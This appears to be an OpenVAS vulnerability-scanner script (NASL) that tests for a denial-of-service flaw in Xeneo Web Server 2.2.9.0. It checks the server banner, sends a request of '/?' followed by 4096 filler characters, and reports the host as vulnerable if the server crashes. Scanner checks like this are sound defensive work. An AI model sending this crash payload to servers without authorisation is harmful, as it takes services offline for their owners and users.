# SPDX-FileCopyrightText: 2003 A.D.Consulting France
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11545");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Xeneo Web Server 2.2.9.0 DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2003 A.D.Consulting France");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl");
  script_mandatory_keys("Xeneo/banner");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.k-otik.com/bugtraq/04.22.Xeneo.php");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/7398");

  script_tag(name:"solution", value:"Upgrade to latest version of Xeneo Web Server");

  script_tag(name:"summary", value:"Requesting an overly long URL starting with an interrogation
  mark (as in /?AAAAA[....]AAAA) crashes the remote server (possibly Xeneo Web Server).");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if( ! http_can_host_php(port:port) )
  exit(0);

if(http_is_dead(port:port))
  exit(0);

banner = http_get_remote_headers(port:port);
if(!banner || "Xeneo" >!< banner)
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

buffer = http_get(item:string("/?", crap(4096)), port:port);
send(socket:soc, data:buffer);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port);
  exit(0);
}

exit(99);
